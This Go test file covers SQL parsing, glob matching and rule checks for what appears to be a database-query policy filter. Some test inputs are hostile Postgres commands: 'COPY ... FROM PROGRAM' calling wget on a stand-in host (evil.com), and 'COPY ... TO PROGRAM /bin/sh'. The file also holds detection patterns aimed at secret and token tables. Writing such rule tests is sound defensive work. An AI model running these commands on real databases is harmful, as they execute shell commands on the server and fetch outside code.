package main

import "testing"

func TestParseSQL(t *testing.T) {
	tests := []struct {
		sql      string
		verb     string
		tables   []string
		function string
	}{
		{
			"SELECT * FROM users WHERE id = 1",
			"select", []string{"users"}, "",
		},
		{
			"SELECT u.id, o.total FROM users u JOIN orders o ON u.id = o.user_id",
			"select", []string{"users", "orders"}, "",
		},
		{
			"INSERT INTO audit_log (event, ts) VALUES ('login', now())",
			"insert", []string{"audit_log"}, "audit_log",
		},
		{
			"UPDATE secrets SET value = 'x' WHERE name = 'key'",
			"update", []string{"secrets"}, "",
		},
		{
			"DELETE FROM sessions WHERE expired_at < now()",
			"delete", []string{"sessions"}, "now",
		},
		{
			"DROP TABLE users",
			"drop", nil, "",
		},
		{
			"SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
			"select", []string{"pg_stat_activity"},
			"pg_terminate_backend",
		},
		{
			"SELECT json_agg(t) FROM tokens t",
			"select", []string{"tokens"}, "json_agg",
		},
		{
			"  \n  SELECT 1  \n  ",
			"select", nil, "",
		},
		{
			"EXPLAIN SELECT * FROM users",
			"explain", []string{"users"}, "",
		},
		{
			"", "", nil, "",
		},
		{
			"VACUUM",
			"vacuum", nil, "",
		},
		{
			"SELECT e.value FROM env_vars e WHERE e.is_secret = false",
			"select", []string{"env_vars"}, "",
		},
		{
			// tableRE matches FROM PROGRAM (best-effort)
			"COPY data FROM PROGRAM 'wget http://evil.com'",
			"copy", []string{"program"}, "",
		},
		{
			"SELECT * FROM public.users JOIN public.orders ON true",
			"select",
			[]string{"public.users", "public.orders"}, "",
		},
	}
	for _, tt := range tests {
		info := parseSQL(tt.sql)
		if info.Verb != tt.verb {
			t.Errorf("parseSQL(%q).Verb = %q, want %q",
				tt.sql, info.Verb, tt.verb)
		}
		if !strSliceEq(info.Tables, tt.tables) {
			t.Errorf("parseSQL(%q).Tables = %v, want %v",
				tt.sql, info.Tables, tt.tables)
		}
		if info.Function != tt.function {
			t.Errorf("parseSQL(%q).Function = %q, want %q",
				tt.sql, info.Function, tt.function)
		}
	}
}

func TestGlobMatch(t *testing.T) {
	tests := []struct {
		pat, s string
		want   bool
	}{
		{"*COPY*FROM PROGRAM*", "COPY data FROM PROGRAM 'wget'", true},
		{"*COPY*FROM PROGRAM*", "SELECT 1", false},
		{"*COPY*TO PROGRAM*", "COPY data TO PROGRAM '/bin/sh'", true},
		{"select", "SELECT", true}, // case insensitive
		{"select", "select", true},
		{"*secret*", "read the secret value", true},
		{"*secret*", "normal query", false},
		{"exact", "exact", true},
		{"exact", "not exact", false},
	}
	for _, tt := range tests {
		got, err := globMatch(tt.pat, tt.s)
		if err != nil {
			t.Fatalf("globMatch(%q, %q) error: %v",
				tt.pat, tt.s, err)
		}
		if got != tt.want {
			t.Errorf("globMatch(%q, %q) = %v, want %v",
				tt.pat, tt.s, got, tt.want)
		}
	}
}

func TestCheckSQL(t *testing.T) {
	tests := []struct {
		name string
		m    Match
		info pgInfo
		want bool
	}{
		{
			"verb match",
			Match{SQLVerb: []string{"select"}},
			pgInfo{Verb: "select"},
			true,
		},
		{
			"verb mismatch",
			Match{SQLVerb: []string{"select"}},
			pgInfo{Verb: "drop"},
			false,
		},
		{
			"multi verb",
			Match{SQLVerb: []string{"insert", "update", "delete"}},
			pgInfo{Verb: "update"},
			true,
		},
		{
			"table match",
			Match{SQLTables: []string{"users"}},
			pgInfo{Verb: "select", Tables: []string{"users"}},
			true,
		},
		{
			"table mismatch",
			Match{SQLTables: []string{"secrets"}},
			pgInfo{Verb: "select", Tables: []string{"users"}},
			false,
		},
		{
			"table any match",
			Match{SQLTables: []string{"secrets"}},
			pgInfo{
				Verb:   "select",
				Tables: []string{"users", "secrets"},
			},
			true,
		},
		{
			"function match",
			Match{SQLFunction: []string{"pg_terminate_backend"}},
			pgInfo{
				Verb:     "select",
				Function: "pg_terminate_backend",
			},
			true,
		},
		{
			"function negation",
			Match{SQLFunction: []string{"!pg_terminate_backend"}},
			pgInfo{Verb: "select", Function: "pg_terminate_backend"},
			false,
		},
		{
			"statement glob",
			Match{Statement: "*COPY*FROM PROGRAM*"},
			pgInfo{
				Verb:      "copy",
				Statement: "COPY data FROM PROGRAM 'wget'",
			},
			true,
		},
		{
			"statement regex",
			Match{
				StatementRegex: `(?i)\b(secrets|password|tokens)\b`,
			},
			pgInfo{
				Verb:      "select",
				Statement: "SELECT * FROM tokens",
			},
			true,
		},
		{
			"statement regex no match",
			Match{
				StatementRegex: `(?i)\b(secrets|password|tokens)\b`,
			},
			pgInfo{
				Verb:      "select",
				Statement: "SELECT * FROM users",
			},
			false,
		},
		{
			"verb + table conjunction",
			Match{
				SQLVerb:   []string{"select"},
				SQLTables: []string{"secrets"},
			},
			pgInfo{
				Verb:   "insert",
				Tables: []string{"secrets"},
			},
			false, // verb fails
		},
		{
			"nil match passes",
			Match{},
			pgInfo{Verb: "drop"},
			true, // no facets = pass
		},
	}
	for _, tt := range tests {
		got := tt.m.checkSQL(tt.info)
		if got != tt.want {
			t.Errorf("%s: checkSQL = %v, want %v",
				tt.name, got, tt.want)
		}
	}
}

func strSliceEq(a, b []string) bool {
	if len(a) == 0 && len(b) == 0 {
		return true
	}
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
